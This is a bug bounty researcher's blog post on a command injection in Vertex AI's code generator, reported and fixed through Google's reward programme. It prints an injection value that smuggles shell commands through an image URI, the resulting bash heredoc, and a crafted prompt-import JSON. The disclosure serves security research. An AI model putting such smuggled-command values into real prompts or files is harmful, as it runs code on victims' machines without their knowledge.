---
title: "My first bug in Google Cloud: Command injection in Vertex AI"
permalink: /bug_vertex_ai/
---

# My first bug in Google Cloud: Command injection in Vertex AI

### The beginning

\> Looking at Google's VRP rewards table, Google main products look interesting. \
\> I’ve heard those products are really hardened though. \
\> I wonder whether command injections still appear or not there… \
\> They seem like a nice choice to hack on \
\> Sure, they are hardened, but I can do it! \
\> And if I get good at those, I can find really cool stuff =) \
\> Therefore, I’ll focus on those.

> The thought lasted for some time…

\> This looks really cool: [Protecting Large Language Models](https://bughunters.google.com/blog/5679863572070400/protecting-large-language-models) \
\> They used some cool tricks and techniques to inject arbitrary commands in Vertex AI via the tuning process. \
\> It seems that bug class still appears.

### The research

> It felt more real than ever… \
> Sometimes these things must be seen before we truly believe they still exist…

\> After checking a feature in Vertex AI called "Create a prompt", it seems it’s for testing prompts with different models. \
\> I could try using images to exfiltrate data, but the chat doesn’t seem to contain sensitive data… \
\> There is also a feature called "Get code" that generates code to call Google APIs using my prompt, but it seems to prevent command injections because it escapes my inputs… =( \
\> I need to get creative, and try more stuff! \
\> There is a product security team reviewing the security of those components, and a ton of bug hunters constantly testing them. \
\> I feel I can't do it. \
\> But if I don't try, I’ll never know. I'll just have fun, treat it like a challenge, and if I don't find a security issue I still learned a ton. 

### The breakthrough

> In hacking, there is that thing that appears at the most unexpected times… \
> just like magic...✨ 

\> YES! IT WORKED. When adding an image to the prompt, it is letting me inject arbitrary commands / code shown in the generated "Get code" content via the image URI! \
\> That's interesting. It seems they weren't escaping the image URIs. \
\> This is the image URI: `http://www.google.com/"\nEOF\nid\n<< EOF\n-` \
\> And the generated code looks like this: 

```bash
cat << EOF \> request.json
{
  "contents": [
    {
      "role": "user",
      "parts": [
        {
          "fileData": {
            "mimeType": "image/jpeg",
            "fileUri": "http://www.google.com/"
EOF
id
<< EOF
-"
          }
        }
      ]
    }
  ]
<..>
```
  
\> It also works with Python generated code. \
\> In the end, it was possible! =) \
\> Mm, I wonder if they will accept it as it is, since the victim would have to copy and paste the malicious content into the chat. \
\> Well, it would be gold if I could achieve it using a file upload, or something like that. \
\> Mm, I'll try to see if I can make it work with the prompt management feature, that allows importing prompts from files. \
\> So, I would need to provide a JSON with some parameters to import the prompt. It might take some time… I should look at the docs. \
\> What if I try exporting the prompt as a JSON file? There's a feature for that, and it could make it easier to test things, especially if I have to make any changes. \
\> So, I have the prompt file ready, and it worked. I'll report the issue using this: 

```json
{
  <..>
  "type": "multimodal_freeform",
  "prompt": {
    "parts": [
      {
        "fileData": {
          "mimeType": "image/jpeg",
          "fileUri": "http://www.google.com/\"\nEOF\nid\n<< EOF\n-"
        }
      }
    ]
  },
  "model": "google/gemini-2.0-flash-001"
}
```

\> Looks solid! 

### Contacting Google

```html
 —--------------------------
|     Report sent          |
|   awaiting triage…       |
 —--------------------------
```
  
\> Google: 🎉 Nice catch!

```html
 —--------------------------
|        Bug filed         |
|      awaiting panel      |
 —--------------------------
```
  
\> Google: Cloud Vulnerability Reward Program panel has decided to issue a reward of $3133.70 for your report. Congratulations!

### The bug resolution

\> Google: We want to thank the researcher for responsibly reporting this issue to Google Cloud. His report has helped to improve our overall security posture and the mitigation is now in production. \
\
Thanks, \
Cote' - Cloud VRP Lead 

### The conclusion

\> It's now fixed and they mitigated it in a timely manner. \
\> I'm going to stick with this program! It's been a great experience so far, and I feel they really value my contributions. \
\> What are you waiting for? Find your vulnz! 
